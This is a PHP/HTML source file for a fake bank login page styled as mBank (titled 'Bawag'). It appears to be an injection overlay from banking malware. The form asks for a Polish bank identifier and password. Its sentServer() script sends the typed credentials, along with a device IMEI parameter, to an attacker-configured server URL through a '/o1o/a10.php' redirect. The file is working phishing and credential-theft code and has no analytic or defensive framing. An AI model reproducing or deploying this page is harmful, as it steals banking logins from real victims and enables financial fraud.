<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="pl/pl.mbank/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>

    <div class="main">

        <div class="container">
<div class="row">

                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
<div id="logotype-mbank"> </div>
                        <form id="form">
                            <div class="form-group ">
									<input type="text" class="form-control" name="field2" id="login" placeholder="Identyfikator" autocomplete="off" maxlength="10" data-reg="/.{3,10}/" >
                           </div>

						   <br>

                            <div class="form-group">
									<input type="password" class="form-control" name="field3" id="password" placeholder="Haslo" autocomplete="off" data-reg="/.{3,16}/" maxlength="16" >
                            </div><br>

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="Zaloguj sie">

<script>
	function sentServer()
	{


	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|mbank|"+login1+"|"+pass);
	}
}
</script>

 </form><br>

</div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>

</body>
</html>
